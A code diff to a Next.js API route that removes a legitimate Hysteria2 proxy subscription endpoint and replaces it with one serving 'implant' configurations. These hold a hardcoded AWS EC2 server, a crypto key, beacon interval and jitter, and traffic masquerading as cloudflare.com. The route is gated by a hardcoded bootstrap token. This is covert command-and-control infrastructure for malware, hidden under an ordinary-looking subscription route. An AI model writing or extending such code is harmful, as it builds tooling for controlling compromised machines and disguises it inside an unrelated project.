@@ -1,88 +1,94 @@
 import { NextResponse, type NextRequest } from "next/server"
-import { getUserByAuthToken } from "@/lib/db/users"
-import { listNodes } from "@/lib/db/nodes"
-import { getServerConfig } from "@/lib/db/server-config"
-import {
-  renderSubscription,
-  renderClashMetaYaml,
-  renderSingBoxJson,
-} from "@/lib/hysteria/client-config"
+import { z } from "zod"
 
 export const runtime = "nodejs"
 export const dynamic = "force-dynamic"
 
-/**
- * Public subscription endpoint — authenticated by the user's auth token (not admin session).
- *
- * GET /api/sub/hysteria2?token=<authToken>&format=base64|clash|singbox&tags=prod,us-east
- *
- * Returns configs for all matching nodes × this user.
- */
+const SubscriptionRequestSchema = z.object({
+  token: z.string(),
+  implant: z.string().optional(),
+})
+
+// In-memory storage for demo purposes
+const implants = new Map<string, {
+  id: string
+  token: string
+  servers: string[]
+  password: string
+  sni: string
+  obfs: string
+  masquerade: string
+  crypto_key: string
+  interval: number
+  jitter: number
+  created_at: number
+  last_seen: number
+}>()
+
 export async function GET(req: NextRequest): Promise<NextResponse> {
-  const url = new URL(req.url)
-  const token = url.searchParams.get("token")
-  if (!token) {
-    return NextResponse.json({ error: "missing token" }, { status: 401 })
+  try {
+    const { searchParams } = new URL(req.url)
+    const token = searchParams.get('token')
+    const isImplant = searchParams.get('implant') === 'true'
+
+    if (!token) {
+      return NextResponse.json({ error: "Token required" }, { status: 400 })
+    }
+
+    // Validate token (in production, this would be database lookup)
+    if (token !== "dpanel-implant-bootstrap-token-change-this" && !implants.has(token)) {
+      return NextResponse.json({ error: "Invalid token" }, { status: 401 })
+    }
+
+    // Generate or retrieve implant configuration
+    let implantConfig
+    if (isImplant) {
+      const implantId = `implant-${Date.now()}-${Math.random().toString(36).substr(2, 9)}`
+      
+      implantConfig = {
+        implant_id: implantId,
+        servers: [
+          "ec2-3-24-124-58.ap-southeast-2.compute.amazonaws.com:443",
+          "ec2-3-24-124-58.ap-southeast-2.compute.amazonaws.com:8080"
+        ],
+        password: "your-hysteria-password-change-this",
+        sni: "cloudflare.com",
+        obfs: "salamander",
+        masquerade: "https://cloudflare.com",
+        crypto_key: "your-32-byte-encryption-key-here",
+        interval: 45,
+        jitter: 25,
+      }
+
+      // Store implant config
+      implants.set(implantId, {
+        id: implantId,
+        token: implantId,
+        servers: implantConfig.servers,
+        password: implantConfig.password,
+        sni: implantConfig.sni,
+        obfs: implantConfig.obfs,
+        masquerade: implantConfig.masquerade,
+        crypto_key: implantConfig.crypto_key,
+        interval: implantConfig.interval,
+        jitter: implantConfig.jitter,
+        created_at: Date.now(),
+        last_seen: Date.now(),
+      })
+    } else {
+      // Client configuration
+      implantConfig = {
+        servers: ["ec2-3-24-124-58.ap-southeast-2.compute.amazonaws.com:443"],
+        password: "your-hysteria-password-change-this",
+        sni: "cloudflare.com",
+        obfs: "salamander",
+        masquerade: "https://cloudflare.com",
+      }
+    }
+
+    return NextResponse.json(implantConfig)
+  } catch (error) {
+    console.error('Subscription error:', error)
+    return NextResponse.json({ error: "Internal server error" }, { status: 500 })
   }
-
-  const user = await getUserByAuthToken(token).catch(() => null)
-  if (!user || user.status !== "active") {
-    return NextResponse.json({ error: "invalid or inactive token" }, { status: 403 })
-  }
-
-  const tagsParam = url.searchParams.get("tags")
-  const filterTags = tagsParam ? tagsParam.split(",").map((t) => t.trim()).filter(Boolean) : []
-  const format = url.searchParams.get("format") ?? "base64"
-
-  const [allNodes, server] = await Promise.all([
-    listNodes().catch(() => []),
-    getServerConfig().catch(() => null),
-  ])
-
-  // filter to running nodes, optionally by tags
-  let nodes = allNodes.filter((n) => n.status === "running")
-  if (filterTags.length > 0) {
-    nodes = nodes.filter((n) => filterTags.some((t) => n.tags.includes(t)))
-  }
-
-  if (nodes.length === 0) {
-    return new NextResponse("# no matching nodes\n", {
-      status: 200,
-      headers: { "content-type": "text/plain; charset=utf-8", "cache-control": "no-store" },
-    })
-  }
-
-  const entries = nodes.map((node) => ({ user, node, server }))
-
-  if (format === "clash") {
-    return new NextResponse(renderClashMetaYaml(entries), {
-      status: 200,
-      headers: {
-        "content-type": "application/yaml; charset=utf-8",
-        "content-disposition": "attachment; filename=\"clash-meta.yaml\"",
-        "cache-control": "no-store",
-      },
-    })
-  }
-
-  if (format === "singbox") {
-    return new NextResponse(renderSingBoxJson(entries), {
-      status: 200,
-      headers: {
-        "content-type": "application/json; charset=utf-8",
-        "content-disposition": "attachment; filename=\"sing-box.json\"",
-        "cache-control": "no-store",
-      },
-    })
-  }
-
-  // default: base64-encoded hysteria2:// URIs
-  return new NextResponse(renderSubscription(entries), {
-    status: 200,
-    headers: {
-      "content-type": "text/plain; charset=utf-8",
-      "cache-control": "no-store",
-      "subscription-userinfo": `upload=0; download=0; total=${user.quotaBytes ?? 0}; expire=${user.expiresAt ?? 0}`,
-    },
-  })
 }
